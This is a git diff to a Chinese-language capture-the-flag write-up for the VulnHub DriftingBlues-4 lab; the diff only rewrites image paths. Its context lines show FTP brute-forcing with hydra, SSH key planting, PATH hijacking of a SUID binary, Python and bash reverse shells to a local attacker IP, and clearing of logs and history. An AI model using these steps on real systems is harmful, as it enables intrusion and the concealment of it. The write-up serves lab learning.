@@ -10,19 +10,19 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\1.jpg)
+![](./pic-4/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\2.jpg)
+![](./pic-4/2.jpg)
 
 ## FTP服务探测
 
 尝试使用`anonymous`匿名空密码登录
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\3.jpg)
+![](./pic-4/3.jpg)
 
 ## 网站探测
 
@@ -32,11 +32,11 @@
 gobuster dir -u http://192.168.1.61 -w /usr/share/wordlists/dirb/big.txt -x php,zip,md,txt,html,jpg -b 404,403 -d
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\3-1.jpg)
+![](./pic-4/3-1.jpg)
 
 访问80端口，查看页面源代码
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\4.jpg)
+![](./pic-4/4.jpg)
 
 
 
@@ -44,23 +44,23 @@ gobuster dir -u http://192.168.1.61 -w /usr/share/wordlists/dirb/big.txt -x php,
 
 尝试进行解码操作
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\5.jpg)
+![](./pic-4/5.jpg)
 
 访问`imfuckingmad.txt`文件
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\6.jpg)
+![](./pic-4/6.jpg)
 
 使用网站`www.dcode.fr`分析
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\7.jpg)
+![](./pic-4/7.jpg)
 
 解码后发现`/iTiS3Cr3TbiTCh.png`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\8.jpg)
+![](./pic-4/8.jpg)
 
 访问`/iTiS3Cr3TbiTCh.png`发现二维码
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\9.jpg)
+![](./pic-4/9.jpg)
 
 对该二维码图片进行解析，把图片下载到`kali`中
 
@@ -72,13 +72,13 @@ apt-get install zbar-tools
 
 或者使用网上的在线二维码解析`https://cli.im/deqr`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\10.jpg)
+![](./pic-4/10.jpg)
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\11.jpg)
+![](./pic-4/11.jpg)
 
 访问解析出的链接，因为是国外制造的靶场，所以这个链接需要代理一下
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\12.jpg)
+![](./pic-4/12.jpg)
 
 # 漏洞寻找
 
@@ -86,7 +86,7 @@ apt-get install zbar-tools
 
 给出几个用户名，把该做出字典，然后爆破`ssh`服务，不过测试发现，SSH服务不支持密码登录
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\13.jpg)
+![](./pic-4/13.jpg)
 
 那么尝试爆破`ftp`服务，获取到用户名`luther`密码`mypics`
 
@@ -94,23 +94,23 @@ apt-get install zbar-tools
 hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.1.61 ftp
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\14.jpg)
+![](./pic-4/14.jpg)
 
 使用用户名和密码连接`ftp`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\15.jpg)
+![](./pic-4/15.jpg)
 
 下载文件到`kali`中
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\16.jpg)
+![](./pic-4/16.jpg)
 
 查看该文件，并无内容
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\17.jpg)
+![](./pic-4/17.jpg)
 
 再次登录`ftp`，发现`hubert`目录的所有者并非`root`，可能是一个普通用户
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\18.jpg)
+![](./pic-4/18.jpg)
 
 
 
@@ -126,15 +126,15 @@ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.1.61 ftp
 
 生成`ssh`公私钥
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\19.jpg)
+![](./pic-4/19.jpg)
 
 连接`ftp`，在目录`hubert`下创建`.ssh`文件夹，并上传`authorized_keys`到`.ssh`目录
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\20.jpg)
+![](./pic-4/20.jpg)
 
 尝试使用密钥进行`ssh`登录
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\21.jpg)
+![](./pic-4/21.jpg)
 
 # 靶机内信息收集
 
@@ -144,19 +144,19 @@ hydra -L user -P /usr/share/wordlists/rockyou.txt 192.168.1.61 ftp
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\22.jpg)
+![](./pic-4/22.jpg)
 
 查看`getinfo`文件，发现可能是调用一些命令`ip addr、cat /etc/hosts、uname -a`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\23.jpg)
+![](./pic-4/23.jpg)
 
 查看定时任务，以及网络状态
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\24.jpg)
+![](./pic-4/24.jpg)
 
 查看当前用户的主目录发现一个文件，具有可执行的`python`脚本，查看该脚本，发现调用了`os`模块，虽然这里的`os.py`具有可写入权限，但是在调用命令时，需要使用`os`，所以不能直接修改`os.py`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\25.jpg)
+![](./pic-4/25.jpg)
 
 上传`pspy64`检测是否有属于`root`的定时任务，发现每一分钟以`root`也就是`uid=0`执行该脚本，虽然不知道是否是文件所有者的关系，但是有时候是指定用户进行执行
 
@@ -164,7 +164,7 @@ find / -perm -u=s -type f 2>/dev/null
 scp pspy64 hubert@192.168.1.61:/tmp
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\25-1.jpg)
+![](./pic-4/25-1.jpg)
 
 # 提权
 
@@ -180,7 +180,7 @@ scp hubert@192.168.1.61:/usr/bin/getinfo ./
 strings getinfo
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\26.jpg)
+![](./pic-4/26.jpg)
 
 在`/tmp`目录下，创建一个与`ip`同名的名称，并写入脚本，然后使用`export`设置临时环境变量`/tmp`，执行`getinfo`就会提取成功
 
@@ -191,7 +191,7 @@ chmod +x ip
 /usr/bin/getinfo
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\27.jpg)
+![](./pic-4/27.jpg)
 
 ## 方式二
 
@@ -199,7 +199,7 @@ chmod +x ip
 
 先进行测试，把`emergency.py`备份，然后创建一个`emergency.py`，编写代码，等待1分钟，发现文件所有者变为`root`，说明可以提取
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\28.jpg)
+![](./pic-4/28.jpg)
 
 再次写入代码，等待一分钟，发现已经提权
 
@@ -213,7 +213,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\29.jpg)
+![](./pic-4/29.jpg)
 
 如果认为上面的代码太长，也可以使用下面代码，可以直接获得交互式界面
 
@@ -222,29 +222,29 @@ import os
 os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.16/7777 0>&1'")
 ```
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\29-1.jpg)
+![](./pic-4/29-1.jpg)
 
 查看`root`的`flag`
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\30.jpg)
+![](./pic-4/30.jpg)
 
 # 清除痕迹
 
 把`hubert`目录下的文件恢复到原本的状态，别忘了`.ssh`是创建的
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\31.jpg)
+![](./pic-4/31.jpg)
 
 删除在`/tmp`创建和上传的文件
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\34.jpg)
+![](./pic-4/34.jpg)
 
 清除各种日志
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\32.jpg)
+![](./pic-4/32.jpg)
 
 清除命令历史记录
 
-![](D:\stu\vulnhub\DriftingBlues靶场\pic-4\33.jpg)
+![](./pic-4/33.jpg)
 
 
 
